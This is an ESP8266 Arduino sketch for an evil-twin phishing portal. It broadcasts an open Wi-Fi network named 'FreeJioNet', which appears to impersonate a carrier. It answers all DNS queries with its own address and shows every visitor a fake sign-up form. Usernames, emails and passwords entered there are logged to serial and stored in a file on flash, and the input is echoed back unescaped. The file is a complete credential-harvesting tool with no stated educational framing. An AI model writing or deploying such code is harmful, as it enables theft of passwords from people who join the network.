#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String captivePortalHTML = ""
                            "<!DOCTYPE html><html lang='en'><head>"
                            "<meta name='viewport' content='width=device-width'>"
                            "<style>"
                            "form { display: flex; flex-direction: column; max-width: 300px; margin: 0 auto; }"
                            "label { display: inline-block; width: 100px; }"
                            "input[type='text'], input[type='email'], input[type='password'] { width: 100%; margin-bottom: 10px; }"
                            "input[type='submit'] { width: auto; align-self: flex-start; }"
                            "</style>"
                            "</head><body>"
                            "<h2>Sign Up</h2>"
                            "<form method='post' action='/submit'>"
                            "<label for='username'>Username:</label>"
                            "<input type='text' name='username' required>"
                            "<label for='email'>Email:</label>"
                            "<input type='email' name='email' required>"
                            "<label for='password'>Password:</label>"
                            "<input type='password' name='password' required>"
                            "<input type='submit' value='Sign Up'>"
                            "</form></body></html>";


void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("FreeJioNet");
  LittleFS.begin();
  // If DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS requests
  dnsServer.start(DNS_PORT, "*", apIP);

  // Handle captive portal requests with the captive portal HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", captivePortalHTML);
  });

  // Handle form submission on the signup page
  webServer.on("/submit", HTTP_POST, []() {
    String username = webServer.arg("username");
    String email = webServer.arg("email");
    String password = webServer.arg("password");

    // Send signup details to serial
    Serial.println("Received Signup Data:");
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Password: ");
    Serial.println(password);
    // Create a new file or open an existing one for writing ("w" mode).
    File file = LittleFS.open("/myfile.txt", "w");

    if (file) {
        // Write data to the file.
        file.print("Username: ");
        file.println(username);
        file.print("Email: ");
        file.println(email);
        file.print("Password: ");
        file.println(password);
//        file.println("This is a sample text.");
        file.close();
        delay(1000); // Delay for a second to prevent rapid file creation.
    } 
    else {
        // Failed to open the file.
        Serial.println("Failed to open file for writing");
    }
    // Respond to the client with a success message within the captive portal page
    String successMessage = "Sign up successful!<br>";
    successMessage += "Username: " + username + "<br>";
    successMessage += "Email: " + email;

    captivePortalHTML.replace("<h2>Sign Up</h2>", successMessage);
    webServer.send(200, "text/html", captivePortalHTML);
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
